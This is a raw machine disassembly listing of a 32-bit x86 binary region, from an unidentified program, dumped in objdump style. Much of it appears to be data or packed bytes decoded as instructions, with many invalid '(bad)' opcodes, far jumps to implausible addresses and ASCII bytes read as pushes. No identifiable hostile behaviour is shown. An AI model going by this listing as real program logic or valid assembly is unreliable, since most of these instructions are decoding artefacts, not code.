  42192c:	inc    edx
  42192d:	add    BYTE PTR [edx+0x19],bh
  421930:	inc    edx
  421931:	add    BYTE PTR [edx],ch
  421933:	sbb    eax,DWORD PTR [edx+0x0]
  421936:	ficomp WORD PTR [ecx]
  421938:	inc    edx
  421939:	add    BYTE PTR ds:0x36f89ca9,cl
  42193f:	mov    edx,0x1992f89c
  421944:	inc    edx
  421945:	add    BYTE PTR [edx+0x1a],ah
  421948:	inc    edx
  421949:	add    BYTE PTR [esi+0x1a],dh
  42194c:	inc    edx
  42194d:	add    BYTE PTR [edx-0x6dffbde6],al
  421953:	sbb    al,BYTE PTR [edx+0x0]
  421956:	retf   0x4219
  421959:	add    BYTE PTR [esi-0x15ffbde9],dl
  42195f:	sbb    DWORD PTR [edx+0x0],eax
  421962:	ficomp DWORD PTR [ecx]
  421964:	inc    edx
  421965:	add    BYTE PTR [edx+0x1b],al
  421968:	inc    edx
  421969:	add    BYTE PTR [esi+0x19f89c85],dh
  42196f:	or     edx,DWORD PTR [edi]
  421971:	sbb    DWORD PTR [esi+0x14004219],0x881161c
  42197b:	or     eax,0x705
  421980:	inc    eax
  421981:	add    BYTE PTR [edx],bh
  421983:	inc    edx
  421984:	ds ds enter 0x4279,0x0
  42198a:	ins    DWORD PTR es:[edi],dx
  42198b:	push   ebp
  42198c:	inc    esp
  42198d:	imul   ecx,DWORD PTR [eax],0x86275fa
  421993:	in     eax,dx
  421994:	inc    BYTE PTR [edi]
  421996:	aas    
  421997:	cli    
  421998:	mov    ds:0x42198605,eax
  42199d:	add    BYTE PTR [ebp-0x4a07636b],dh
  4219a3:	xchg   esi,eax
  4219a4:	pushf  
  4219a5:	clc    
  4219a6:	mov    ah,0x95
  4219a8:	pushf  
  4219a9:	clc    
  4219aa:	mov    ebx,0xbaf89c95
  4219af:	xchg   ebp,eax
  4219b0:	pushf  
  4219b1:	clc    
  4219b2:	mov    ecx,0xb8f89c95
  4219b7:	xchg   ebp,eax
  4219b8:	pushf  
  4219b9:	clc    
  4219ba:	mov    edi,0xbef89c95
  4219bf:	xchg   ebp,eax
  4219c0:	pushf  
  4219c1:	clc    
  4219c2:	mov    ebp,0xa6f89c95
  4219c7:	xchg   ebp,eax
  4219c8:	pushf  
  4219c9:	clc    
  4219ca:	jmp    0x4217:0x8e6003f9
  4219d1:	add    BYTE PTR [eax+eax*2+0x42],ch
  4219d5:	add    BYTE PTR [ebx+0x77],dl
  4219d8:	jbe    0x421a2a
  4219da:	mov    dh,0x85
  4219dc:	pushf  
  4219dd:	clc    
  4219de:	sbb    ecx,ebp
  4219e0:	push   eax
  4219e1:	pop    es
  4219e2:	dec    eax
  4219e3:	or     al,BYTE PTR [eax]
  4219e5:	add    BYTE PTR [edx+0x1b004217],cl
  4219eb:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421a1e:	ins    BYTE PTR es:[edi],dx
  421a1f:	inc    eax
  421a20:	inc    edx
  421a21:	add    BYTE PTR [esi+0x66f89c85],dh
  421a27:	add    BYTE PTR [edx+0x0],ch
  421a2a:	add    BYTE PTR [si+0x0],ah
  421a2e:	push   0x64006700
  421a33:	add    BYTE PTR [esi+0x0],ah
  421a36:	push   0x0
  421a38:	push   0x66006400
  421a3d:	add    BYTE PTR [edi+0x0],ah
  421a40:	push   0x0
  421a42:	push   0x66006700
  421a47:	add    BYTE PTR [eax+0x0],ch
  421a4a:	add    BYTE PTR [bp+0x0],ah
  421a4e:	push   0x66006700
	...
  421a5b:	add    BYTE PTR [eax],al
  421a5d:	add    BYTE PTR [edi+0x5c],ch
  421a60:	inc    eax
  421a61:	add    BYTE PTR [ebp-0x5db060b1],ah
  421a67:	dec    edi
  421a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a69:	dec    edi
  421a6a:	lahf   
  421a6b:	dec    edi
  421a6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a6d:	dec    edi
  421a6e:	ins    DWORD PTR es:[edi],dx
  421a6f:	dec    esi
  421a70:	bound  ecx,QWORD PTR [esi+0x30]
  421a73:	dec    esi
  421a74:	add    BYTE PTR [eax],al
  421a76:	cdq    
  421a77:	dec    edi
  421a78:	pushf  
  421a79:	dec    edi
  421a7a:	fwait
  421a7b:	dec    edi
  421a7c:	ins    DWORD PTR es:[edi],dx
  421a7d:	dec    esi
  421a7e:	bound  ecx,QWORD PTR [esi+0x30]
  421a81:	dec    esi
  421a82:	scas   eax,DWORD PTR es:[edi]
  421a83:	dec    edi
  421a84:	lods   eax,DWORD PTR ds:[esi]
  421a85:	dec    edi
  421a86:	lahf   
  421a87:	dec    edi
  421a88:	mov    ds:0x624e6d4f,al
  421a8d:	dec    esi
  421a8e:	xor    BYTE PTR [esi+0x0],cl
  421a91:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421a97:	dec    edi
  421a98:	test   eax,0xa04f934f
  421a9d:	dec    edi
  421a9e:	fwait
  421a9f:	dec    edi
  421aa0:	xor    BYTE PTR [esi+0x0],cl
  421aa3:	add    BYTE PTR [eax],al
  421aa5:	add    BYTE PTR [eax],al
  421aa7:	add    BYTE PTR [eax],al
  421aa9:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421ab0:	mov    WORD PTR [ebp-0x32734274],gs
  421ab6:	mov    ebp,ds
  421ab8:	mov    ebp,gs
  421aba:	mov    ebp,?
  421abc:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421ac2:	mov    WORD PTR ds:0x6d8c5d8c,?
  421ac8:	mov    WORD PTR [edx-0x74],?
  421acb:	jae    0x421a59
  421acd:	jo     0x421a5b
  421acf:	jno    0x421a5d
  421ad1:	jbe    0x421a5f
  421ad3:	ja     0x421a61
  421ad5:	je     0x421a63
  421ad7:	jne    0x421a65
  421ad9:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421ae0:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421ae6:	lods   al,BYTE PTR ds:[esi]
  421ae7:	jge    0x421aa5
  421ae9:	jge    0x421a89
  421aeb:	(bad)  
  421aec:	jns    0x421b61
  421aee:	mov    ecx,0x7d738cb1
  421af3:	ins    DWORD PTR es:[edi],dx
  421af4:	enter  0x9fc6,0x26
  421af8:	jb     0x421afd
  421afa:	test   eax,0xb956bb17
  421aff:	hlt    
  421b00:	test   al,0x37
  421b02:	test   al,0x7e
  421b04:	fnstenv [ecx-0x6a]
  421b07:	mov    cl,0x6a
  421b09:	push   0xffffffce
  421b0b:	or     BYTE PTR [edx],bl
  421b0d:	xlat   BYTE PTR ds:[ebx]
  421b0e:	out    dx,eax
  421b0f:	add    eax,0x9321d7aa
  421b14:	scas   al,BYTE PTR es:[edi]
  421b15:	adc    DWORD PTR [esi],esp
  421b17:	jge    0x421b3c
  421b19:	fidiv  WORD PTR [edi]
  421b1b:	leave  
  421b1c:	hlt    
  421b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b1e:	cmp    ax,0x1fc8
  421b22:	mov    dh,cl
  421b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b25:	(bad)  
  421b26:	and    DWORD PTR [eax],ebx
  421b28:	and    DWORD PTR [ecx-0x18],esi
  421b2b:	(bad)  [ebx+0x7]
  421b2e:	cmc    
  421b2f:	enter  0x301a,0x14
  421b33:	inc    eax
  421b34:	inc    edx
  421b35:	add    BYTE PTR [ecx+0x66],dh
  421b38:	jp     0x421ba8
  421b3a:	jle    0x421b55
  421b3c:	inc    edx
  421b3d:	add    dl,ah
  421b3f:	sbb    DWORD PTR [edx+0x0],eax
  421b42:	or     ch,ch
  421b44:	adc    al,BYTE PTR [edi]
  421b46:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421b4d:	ins    BYTE PTR es:[edi],dx
  421b4e:	push   0x49657557
  421b53:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421b59:	push   edi
  421b5a:	jp     0x421bd6
  421b5c:	dec    ebp
  421b5d:	push   esi
  421b5e:	arpl   WORD PTR gs:[ecx+0x45],si
  421b62:	dec    edx
  421b63:	dec    esi
  421b64:	data16 ja 0x421bb5
  421b67:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421b82:	inc    ebp
  421b83:	push   edx
  421b84:	jb     0x421bfa
  421b86:	inc    esi
  421b87:	je     0x421bca
  421b89:	inc    esi
  421b8a:	jae    0x421c02
  421b8c:	dec    ebx
  421b8d:	gs dec ecx
  421b8f:	dec    ebp
  421b90:	dec    ebp
  421b91:	pop    edx
  421b92:	jp     0x421bee
  421b94:	jbe    0x421bdc
  421b96:	pop    ecx
  421b97:	jo     0x421c11
  421b99:	inc    edi
  421b9a:	gs ins BYTE PTR es:[edi],dx
  421b9c:	dec    esp
  421b9d:	js     0x421c07
  421b9f:	inc    edx
  421ba0:	js     0x421be8
  421ba2:	dec    eax
  421ba3:	inc    ebp
  421ba4:	inc    esp
  421ba5:	inc    esp
  421ba6:	push   ecx
  421ba7:	dec    edx
  421ba8:	ins    BYTE PTR es:[edi],dx
  421ba9:	dec    ebx
  421baa:	jbe    0x421c1a
  421bac:	pop    eax
  421bad:	jbe    0x421bfa
  421baf:	inc    ecx
  421bb0:	fs gs jno 0x421c21
  421bb4:	push   ebx
  421bb5:	inc    ecx
  421bb6:	add    BYTE PTR [eax],al
  421bb8:	inc    ebx
  421bb9:	outs   dx,BYTE PTR ds:[esi]
  421bba:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421bbe:	push   edx
  421bbf:	push   ecx
  421bc0:	push   0x74000064
  421bc5:	jne    0x421c3c
  421bc7:	ins    DWORD PTR es:[edi],dx
  421bc8:	push   ecx
  421bc9:	push   eax
  421bca:	jo     0x421c46
  421bcc:	addr16 jo 0x421c25
  421bcf:	pop    eax
  421bd0:	add    BYTE PTR [eax],al
  421bd2:	push   ecx
  421bd3:	pop    ecx
  421bd4:	inc    ebx
  421bd5:	inc    edx
  421bd6:	outs   dx,BYTE PTR ds:[esi]
  421bd7:	popa   
  421bd8:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421bdc:	jne    0x421c4c
  421bde:	dec    ebx
  421bdf:	je     0x421c44
  421be1:	bound  esp,QWORD PTR [edi+0x0]
  421be4:	jns    0x421c2b
  421be6:	bound  ebp,QWORD PTR [ecx+0x46]
  421be9:	dec    ecx
  421bea:	ja     0x421c31
  421bec:	dec    eax
  421bed:	inc    ebp
  421bee:	inc    edx
  421bef:	push   ebx
  421bf0:	add    BYTE PTR [eax],al
  421bf2:	outs   dx,DWORD PTR ds:[esi]
  421bf3:	inc    edi
  421bf4:	dec    esi
  421bf5:	outs   dx,DWORD PTR ds:[esi]
  421bf6:	pop    ecx
  421bf7:	inc    edi
  421bf8:	jb     0x421c41
  421bfa:	jns    0x421c72
  421bfc:	inc    ecx
  421bfd:	pop    eax
  421bfe:	dec    esp
  421bff:	add    BYTE PTR [eax+0x48],bh
  421c02:	bound  edx,QWORD PTR [ebx+0x43]
  421c05:	pop    eax
  421c06:	outs   dx,DWORD PTR ds:[esi]
  421c07:	push   0x4355
  421c0c:	dec    esp
  421c0d:	ins    BYTE PTR es:[edi],dx
  421c0e:	inc    edx
  421c0f:	push   0x76666a73
  421c14:	inc    edx
  421c15:	jo     0x421c17
  421c17:	add    BYTE PTR [eax],al
  421c19:	add    BYTE PTR [edi+0x6d],ah
  421c1c:	je     0x421c65
  421c1e:	ins    BYTE PTR es:[edi],dx
  421c1f:	jae    0x421c8b
  421c21:	inc    esi
  421c22:	ins    DWORD PTR es:[edi],dx
  421c23:	je     0x421c7b
  421c25:	push   0x56584178
  421c2a:	push   ebx
  421c2b:	addr16 dec edx
  421c2d:	jo     0x421ca1
  421c2f:	js     0x421ca0
  421c31:	pop    eax
  421c32:	dec    ebx
  421c33:	push   esp
  421c34:	dec    esp
  421c35:	jns    0x421c82
  421c37:	js     0x421cb1
  421c39:	outs   dx,BYTE PTR ds:[esi]
  421c3a:	pop    ecx
  421c3b:	jae    0x421cab
  421c3d:	push   0x43644448
  421c42:	arpl   WORD PTR [edx+0x55],sp
  421c45:	push   0x42504e67
  421c4a:	push   ebp
  421c4b:	je     0x421cc2
  421c4d:	addr16 dec edi
  421c4f:	dec    esp
  421c50:	inc    edx
  421c51:	ins    DWORD PTR es:[edi],dx
  421c52:	inc    esi
  421c53:	inc    esi
  421c54:	inc    esi
  421c55:	arpl   WORD PTR [edx+0x47],bx
  421c58:	push   ebp
  421c59:	inc    ebx
  421c5a:	popa   
  421c5b:	push   edx
  421c5c:	dec    esp
  421c5d:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421c64:	push   ecx
  421c65:	push   ebx
  421c66:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421c6d:	dec    edx
  421c6e:	jns    0x421cd9
  421c70:	push   edx
  421c71:	inc    ebx
  421c72:	jo     0x421ce9
  421c74:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421c78:	fs push ebx
  421c7a:	inc    ebx
  421c7b:	push   ebp
  421c7c:	push   eax
  421c7d:	ja     0x421cba
  421c7f:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421c83:	mov    ebp,0xa53ddffb
  421c88:	js     0x421c43
  421c8a:	jmp    0x421ca0
  421c8c:	xchg   esi,eax
  421c8d:	pop    edi
  421c8e:	mov    dh,0xd5
  421c90:	add    DWORD PTR [eax],eax
  421c92:	popa   
  421c93:	add    BYTE PTR [eax],al
  421c95:	add    BYTE PTR [ebx+0x15cdcf],cl
  421c9b:	jmp    0xde6d:0x270212aa
  421ca2:	popa   
  421ca3:	test   DWORD PTR [edx],ebx
  421ca5:	add    ebx,DWORD PTR [esi]
  421ca7:	push   edx
  421ca8:	call   0xcbee1005
  421cad:	and    esp,esp
  421caf:	pop    esi
  421cb0:	aas    
  421cb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cb2:	inc    edx
  421cb3:	out    dx,eax
  421cb4:	sti    
  421cb5:	mov    dh,0x97
  421cb7:	(bad)  
  421cb8:	std    
  421cb9:	inc    edi
  421cba:	and    cl,0x38
  421cbd:	data16 rep outs dx,BYTE PTR ds:[esi]
  421cc0:	jo     0x421c54
  421cc2:	mov    cl,0x81
  421cc4:	and    al,0xd8
  421cc6:	aas    
  421cc7:	pop    ebp
  421cc8:	in     al,dx
  421cc9:	iret   
  421cca:	in     al,dx
  421ccb:	ss pop ss
  421ccd:	pop    esi
  421cce:	sti    
  421ccf:	lods   eax,DWORD PTR ds:[esi]
  421cd0:	mov    ch,BYTE PTR [eax-0x1e80e4c8]
  421cd6:	push   ecx
  421cd7:	pop    es
  421cd8:	das    
  421cd9:	shr    DWORD PTR [edx+ecx*4],1
  421cdc:	inc    eax
  421cdd:	xor    DWORD PTR [ecx+0x547d28dc],0x2aee297f
  421ce7:	sti    
  421ce8:	sti    
  421ce9:	std    
  421cea:	mov    ds:0xc2f8f59b,al
  421cef:	nop
  421cf0:	js     0x421ce0
  421cf2:	dec    ecx
  421cf3:	mov    WORD PTR ss:0x64,?
  421cfa:	add    BYTE PTR [eax],al
  421cfc:	add    BYTE PTR [eax],al
  421cfe:	sub    BYTE PTR [edx+0x57bf52a5],dh
  421d04:	(bad)  
  421d05:	cli    
  421d06:	jl     0x421d6c
  421d08:	xlat   BYTE PTR ds:[ebx]
  421d09:	push   esi
  421d0a:	pop    eax
  421d0b:	icebp  
  421d0c:	cmp    bh,BYTE PTR [ecx+0x17]
  421d0f:	(bad)  
  421d10:	add    DWORD PTR [eax],eax
  421d12:	popa   
  421d13:	add    BYTE PTR [eax],al
  421d15:	add    BYTE PTR [ebx-0x5740c33c],dh
  421d1b:	pop    ebp
  421d1c:	pushf  
  421d1d:	push   ebx
  421d1e:	icebp  
  421d1f:	push   esp
  421d20:	fnstsw WORD PTR [edi]
  421d22:	mov    BYTE PTR [edx+ebp*8],bl
  421d25:	fstp   DWORD PTR [eax+ecx*1-0x59]
  421d29:	(bad)  
  421d2a:	pusha  
  421d2b:	push   ss
  421d2c:	hlt    
  421d2d:	sbb    eax,DWORD PTR ds:0x37f0579e
  421d33:	jmp    0x421d82
  421d35:	add    DWORD PTR [eax+ebx*4],edx
  421d38:	pop    ebx
  421d39:	nop
  421d3a:	xchg   esi,eax
  421d3b:	sbb    BYTE PTR [ebp+ebx*8+0x2b],bl
  421d3f:	aam    0x95
  421d41:	(bad)  
  421d42:	fsub   QWORD PTR [edx+0x60]
  421d45:	xor    BYTE PTR [edi],ch
  421d47:	fidiv  DWORD PTR [esi]
  421d49:	jmp    0x98f0:0xd7c6d797
  421d50:	cdq    
  421d51:	dec    eax
  421d52:	sbb    BYTE PTR [eax-0x388acbe1],bl
  421d58:	or     cl,BYTE PTR [ebx-0x1b3e99d9]
  421d5e:	and    eax,0x53efe9d9
  421d63:	and    dh,bh
  421d65:	test   BYTE PTR [ebx+0x6bdec266],cl
  421d6b:	int    0xfb
  421d6d:	sbb    cl,dl
  421d6f:	test   DWORD PTR [eax+0x4e],ebp
  421d72:	sub    al,0xcc
  421d74:	xor    bl,bl
  421d76:	xchg   edx,eax
  421d77:	add    BYTE PTR [eax],al
  421d79:	add    BYTE PTR [eax],al
  421d7b:	add    BYTE PTR [eax],al
  421d7d:	add    BYTE PTR [ebx-0x7e80ab],dh
  421d83:	stos   DWORD PTR es:[edi],eax
  421d84:	push   DWORD PTR [edi-0x42]
  421d87:	xchg   esi,eax
  421d88:	push   0x61ecfc57
  421d8d:	aam    0x78
  421d8f:	(bad)  
  421d90:	add    DWORD PTR [eax],eax
  421d92:	popa   
  421d93:	add    BYTE PTR [eax],al
  421d95:	add    BYTE PTR [ebx+eax*2-0x3],ah
  421d99:	and    DWORD PTR [ebx],0x35428c89
  421d9f:	adc    DWORD PTR [ecx+0x3180b94a],esp
  421da5:	rol    BYTE PTR [ebx],0x8c
  421da8:	mov    cl,0x5d
  421daa:	xor    al,0x6f
  421dac:	(bad)  
  421dad:	mov    esi,0x893d235
  421db2:	fistp  WORD PTR [ebp+eiz*2+0x3179c4ad]
  421db9:	into   
  421dba:	shl    edx,0x11
  421dbd:	mov    al,ds:0xc997ea6f
  421dc2:	test   ch,bh
  421dc4:	sbb    esi,DWORD PTR [eax-0x2a]
  421dc7:	cmc    
  421dc8:	lods   eax,DWORD PTR ds:[esi]
  421dc9:	imul   edx,DWORD PTR [edi+0x65],0xffffffd7
  421dcd:	pop    eax
  421dce:	inc    ebp
  421dcf:	popa   
  421dd0:	sbb    BYTE PTR [ebp-0x2f19ad0],bh
  421dd6:	lahf   
  421dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dd8:	sbb    ebx,DWORD PTR [ecx-0x25]
  421ddb:	jae    0x421dec
  421ddd:	into   
  421dde:	ficom  DWORD PTR [ebx]
  421de0:	aaa    
  421de1:	push   es
  421de2:	xor    BYTE PTR [ecx-0x4a],ch
  421de5:	and    DWORD PTR [eax],0xffffffa2
  421de8:	jl     0x421e51
  421dea:	add    edx,DWORD PTR [eax]
  421dec:	dec    ebx
  421ded:	test   BYTE PTR [eax],bh
  421def:	cwde   
  421df0:	dec    ebx
  421df1:	sbb    DWORD PTR [edi-0xfd08c8],esi
  421df7:	add    BYTE PTR [eax],al
  421df9:	add    BYTE PTR [eax],al
  421dfb:	add    BYTE PTR [eax],al
  421dfd:	add    BYTE PTR [eax],bh
  421dff:	(bad)  
  421e00:	cmp    ah,BYTE PTR [esi+edi*8]
  421e03:	in     al,dx
  421e04:	fimul  WORD PTR ds:[edi-0x4d53942b]
  421e0b:	jmp    0x421dc4
  421e0d:	outs   dx,DWORD PTR ds:[esi]
  421e0e:	(bad)  
  421e10:	add    DWORD PTR [eax],eax
  421e12:	popa   
  421e13:	add    BYTE PTR [eax],al
  421e15:	add    BYTE PTR [ebp-0x3a],bl
  421e18:	cwde   
  421e19:	xchg   esi,eax
  421e1a:	sub    dh,ch
  421e1c:	push   ebx
  421e1d:	add    al,0xb0
  421e1f:	scas   eax,DWORD PTR es:[edi]
  421e20:	mov    al,0xae
  421e22:	rcr    BYTE PTR [edi-0x3d],cl
  421e25:	stos   BYTE PTR es:[edi],al
  421e26:	push   ebp
  421e27:	mov    esi,DWORD PTR [ecx-0x72f61ade]
  421e2d:	cmp    eax,0x1643fc83
  421e32:	mov    ah,BYTE PTR [eax]
  421e34:	cmp    DWORD PTR [esi],ebp
  421e36:	daa    
  421e37:	dec    esi
  421e38:	mov    eax,0x51508a72
  421e3d:	inc    ebx
  421e3e:	enter  0xdc77,0x60
  421e42:	shl    al,1
  421e44:	jo     0x421e0d
  421e46:	(bad)  
  421e47:	mov    ds:0x26d8df53,al
  421e4c:	mov    edi,0x6440d567
  421e51:	pop    ebx
  421e52:	inc    esp
  421e53:	or     bh,BYTE PTR [ebp-0x74d6e36]
  421e59:	ins    BYTE PTR es:[edi],dx
  421e5a:	sbb    BYTE PTR [esi-0x2d931a7b],bh
  421e60:	lea    ebp,[ecx-0x73]
  421e63:	hlt    
  421e64:	mov    edx,0x5c389a79
  421e69:	mov    ebx,0xb7196c45
  421e6e:	mov    ebp,0x33c295d6
  421e73:	retf   
  421e74:	sub    DWORD PTR [ebp+0x8],ebp
  421e7a:	add    BYTE PTR [eax],al
  421e7c:	add    BYTE PTR [eax],al
  421e7e:	fnstenv [esi-0x2490e49a]
  421e84:	std    
  421e85:	neg    BYTE PTR [esi]
  421e87:	sub    esp,DWORD PTR [ebx-0x23]
  421e8a:	sti    
  421e8b:	arpl   WORD PTR [esi],ax
  421e8d:	add    BYTE PTR [edx],bh
  421e8f:	xlat   BYTE PTR ds:[ebx]
  421e90:	add    DWORD PTR [eax],eax
  421e92:	popa   
  421e93:	add    BYTE PTR [eax],al
  421e95:	add    BYTE PTR [esi+0x13d40c73],cl
  421e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e9c:	dec    ebx
  421e9d:	fisub  DWORD PTR [ebx-0x358b2009]
  421ea3:	(bad)  
  421ea4:	popa   
  421ea5:	pop    ebx
  421ea6:	and    al,0x2d
  421ea8:	and    bl,bl
  421eaa:	jle    0x421ebc
  421eac:	sub    dl,ah
  421eae:	pop    edi
  421eaf:	ins    DWORD PTR es:[edi],dx
  421eb0:	sub    BYTE PTR [ebx-0x51],0xc0
  421eb4:	mov    eax,ds:0x5704559a
  421eb9:	fs dec edx
  421ebb:	dec    edi
  421ebc:	nop
  421ebd:	cdq    
  421ebe:	push   0x41
  421ec0:	push   cs
  421ec1:	mov    al,ds:0xda740a75
  421ec6:	inc    ebp
  421ec7:	push   es
  421ec8:	mov    ch,0x1e
  421eca:	mov    eax,ds:0xd66ecdd6
  421ecf:	push   edi
  421ed0:	or     ecx,edi
  421ed2:	mov    ?,eax
  421ed4:	xchg   edi,eax
  421ed5:	push   ecx
  421ed6:	(bad)  
  421ed7:	cmp    ah,BYTE PTR [ebx]
  421ed9:	repnz sub eax,0x2bd3aed3
  421edf:	je     0x421f30
  421ee1:	loopne 0x421f18
  421ee3:	add    al,BYTE PTR [eax]
  421ee5:	aad    0xf1
  421ee7:	adc    al,0x8a
  421ee9:	sbb    DWORD PTR [ebx-0x39],esp
  421eec:	and    eax,0xc059f30b
  421ef1:	lods   al,BYTE PTR ds:[esi]
  421ef2:	cli    
  421ef3:	add    eax,0x74b2fd
  421ef8:	add    BYTE PTR [eax],al
  421efa:	add    BYTE PTR [eax],al
  421efc:	add    BYTE PTR [eax],al
  421efe:	fidiv  DWORD PTR [edx]
  421f00:	xchg   edi,eax
  421f01:	mov    bh,bh
  421f03:	scas   eax,DWORD PTR es:[edi]
  421f04:	fbstp  TBYTE PTR [edx+0x3]
  421f07:	inc    ebp
  421f08:	mov    ds:0x63d6ee5c,eax
  421f0d:	rcr    DWORD PTR [ebx+0x610001d7],cl
  421f13:	add    BYTE PTR [eax],al
  421f15:	add    BYTE PTR [ebx+0x44],ch
  421f18:	aas    
  421f19:	jo     0x421f4d
  421f1b:	cmc    
  421f1c:	lds    esi,FWORD PTR [ebx-0x3a18fc7]
  421f22:	adc    bl,0xce
  421f25:	mov    ah,0x3
  421f27:	push   esp
  421f28:	sbb    eax,0xdf5716ae
  421f2d:	(bad)  
  421f30:	pop    esp
  421f31:	scas   al,BYTE PTR es:[edi]
  421f32:	dec    ecx
  421f33:	xchg   ebp,eax
  421f34:	cmp    al,0xe9
  421f36:	xchg   edx,eax
  421f37:	test   DWORD PTR [esi+0x34191f02],edi
  421f3d:	imul   eax,DWORD PTR [edi-0x230c53c3],0x1f
  421f44:	adc    ch,BYTE PTR [eax]
  421f46:	clc    
  421f47:	mov    ebx,0x37709c2b
  421f4c:	inc    ebx
  421f4d:	mov    ds:0xc3eb6159,al
  421f52:	hlt    
  421f53:	outs   dx,DWORD PTR ds:[esi]
  421f54:	mov    edi,0x9dd678e7
  421f59:	repnz sar DWORD PTR [esi],1
  421f5c:	dec    edx
  421f5d:	loopne 0x421f09
  421f5f:	ficom  DWORD PTR [ebx]
  421f61:	dec    ebp
  421f62:	out    0x87,al
  421f64:	dec    esp
  421f65:	jmp    0x5b8c61de
  421f6a:	jbe    0x421fae
  421f6c:	je     0x421f00
  421f6e:	mov    ebp,0xc23eaaff
  421f73:	rcr    BYTE PTR [ebx+0xda96],0x0
  421f7a:	add    BYTE PTR [eax],al
  421f7c:	add    BYTE PTR [eax],al
  421f7e:	dec    eax
  421f7f:	in     al,0x3
  421f81:	fwait
  421f82:	scas   eax,DWORD PTR es:[edi]
  421f83:	(bad)  
  421f84:	fdiv   st,st(7)
  421f86:	pop    esi
  421f87:	sub    BYTE PTR [eax+0x6d74278f],bl
  421f8d:	sahf   
  421f8e:	cld    
  421f8f:	xlat   BYTE PTR ds:[ebx]
  421f90:	add    DWORD PTR [eax],eax
  421f92:	popa   
  421f93:	add    BYTE PTR [eax],al
  421f95:	add    BYTE PTR ds:0x729728f9,dh
  421f9b:	dec    ecx
  421f9c:	mov    ebp,0x1a63b5de
  421fa1:	idiv   ebx
  421fa3:	out    0x71,al
  421fa5:	cld    
  421fa6:	and    al,0x8e
  421fa8:	lahf   
  421fa9:	ss inc eax
  421fab:	xor    eax,0x93155a92
  421fb0:	add    eax,0xb25063a8
  421fb5:	aam    0xe1
  421fb7:	stc    
  421fb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fb9:	jno    0x421f43
  421fbb:	adc    ah,al
  421fbd:	imul   esi,DWORD PTR [eax+0x71f6e1c8],0xffffffb7
  421fc4:	ds mov esp,0xf2ac3495
  421fca:	es jl  0x421f54
  421fcd:	shr    esp,cl
  421fcf:	pop    edx
  421fd0:	xchg   DWORD PTR [edi+0x7c],esi
  421fd3:	out    dx,eax
  421fd4:	dec    ebp
  421fd5:	jmp    0xa09e:0x6f06c4f8
  421fdc:	cs mov ebp,0xce0d5514
  421fe2:	rol    DWORD PTR [ebx],cl
  421fe4:	xchg   esi,eax
  421fe5:	or     eax,0xecc75f96
  421fea:	mov    ebp,DWORD PTR [eax-0x7f]
  421fed:	xor    DWORD PTR [ebp-0x7d],edi
  421ff0:	int    0x27
  421ff2:	jns    0x421fd4
  421ff4:	pop    ebp
  421ff5:	jnp    0x421fdc
  421ff7:	add    BYTE PTR [eax],al
  421ff9:	add    BYTE PTR [eax],al
  421ffb:	add    BYTE PTR [eax],al
  421ffd:	add    BYTE PTR [edx+0x4],dl
  422000:	mov    ds:0x72a6f682,al
  422005:	aam    0x6d
  422007:	xor    dh,BYTE PTR [edx]
  422009:	and    eax,0xe20db57e
  42200e:	pop    ebp
  42200f:	fadd   DWORD PTR [ecx]
  422011:	add    BYTE PTR [ecx+0x0],ah
  422014:	add    BYTE PTR [eax],al
  422016:	int    0x79
  422018:	push   ss
  422019:	push   edi
  42201a:	and    dh,BYTE PTR [edi]
  42201c:	(bad)  
  42201d:	(bad)  
  42201e:	out    dx,eax
  42201f:	mov    al,ds:0x99646355
  422024:	call   0x82b0:0xec5cdf5
  42202b:	outs   dx,BYTE PTR ds:[esi]
  42202c:	or     BYTE PTR [esi+ecx*8+0x29],dl
  422030:	jae    0x421feb
  422032:	sub    BYTE PTR [esi],bl
  422034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422035:	std    
  422036:	mov    ebx,0x7b19835f
  42203b:	dec    esi
  42203c:	mov    dh,0xfd
  42203e:	out    0x4e,al
  422040:	aam    0xf0
  422042:	(bad)  
  422043:	push   edx
  422044:	ja     0x421fd0
  422046:	jno    0x42201f
  422048:	stc    
  422049:	mov    ch,0xd3
  42204b:	fsub   QWORD PTR [esi-0x7796b998]
  422051:	imul   BYTE PTR [esi]
  422053:	xchg   DWORD PTR [ebx],edi
  422055:	push   ss
  422056:	je     0x42203c
  422058:	mov    gs,WORD PTR [ebp-0x2c339b6d]
  42205e:	sub    eax,0x903bb084
  422063:	mov    ch,0x43
  422065:	enter  0x7df3,0xc4
  422069:	fadd   st,st(7)
  42206b:	push   ss
  42206c:	pop    ss
  42206d:	jg     0x4220d0
  42206f:	mov    dh,0x52
  422071:	mov    ss,WORD PTR [eax+0x2b]
  422074:	push   es
  422075:	jns    0x42202f
  422077:	add    BYTE PTR [eax],al
  422079:	add    BYTE PTR [eax],al
  42207b:	add    BYTE PTR [eax],al
  42207d:	add    BYTE PTR [eax],bh
  42207f:	push   0xffffff96
  422081:	add    edx,esi
  422083:	(bad)  
  422084:	mov    ebp,0xdb4ef67b
  422089:	out    0x44,eax
  42208b:	cmp    al,0xd3
  42208d:	add    DWORD PTR [esi+0x610001d8],edi
  422093:	add    BYTE PTR [eax],al
  422095:	add    BYTE PTR [ebp-0x2d],bl
  422098:	mov    ecx,0x36ec2648
  42209d:	jmp    0xea283064
